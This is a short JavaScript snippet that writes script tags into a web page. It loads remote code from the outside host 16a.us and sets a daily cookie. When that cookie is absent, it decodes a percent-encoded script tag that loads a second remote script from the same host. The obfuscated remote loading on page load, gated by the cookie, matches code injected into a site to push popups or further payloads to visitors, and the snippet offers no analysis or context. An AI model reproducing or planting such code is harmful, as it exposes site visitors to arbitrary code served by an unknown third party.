info =		"<script src=\"http://16a.us/oKK/JsT.js\"></script>"	+"\n"+
		"<script>"	+"\n"+
		"function Get(){"	+"\n"+
		"var Then = new Date() "	+"\n"+
		"Then.setTime(Then.getTime() + 24*60*60*1000)"	+"\n"+
		"var cookieString = new String(document.cookie)"	+"\n"+
		"var cookieHeader = \"Cookie1=\" "	+"\n"+
		"var beginPosition = cookieString.indexOf(cookieHeader)"	+"\n"+
		"if (beginPosition != -1){ "	+"\n"+
		"} else "	+"\n"+
		"{ document.cookie = \"Cookie1=POPWINDOS;expires=\"+ Then.toGMTString() "	+"\n"+
		"document.write(unescape(\"%3Cscript%20src%3D%22http%3A%2F%2F16a%2Eus%2FoKK%2FoKK%2Ejs%22%3E%3C%2Fscript%3E\"));"	+"\n"+
		"}"	+"\n"+
		"}"	+"\n"+
		"Get();"	+"\n"+
		"</script>"

document.write(info)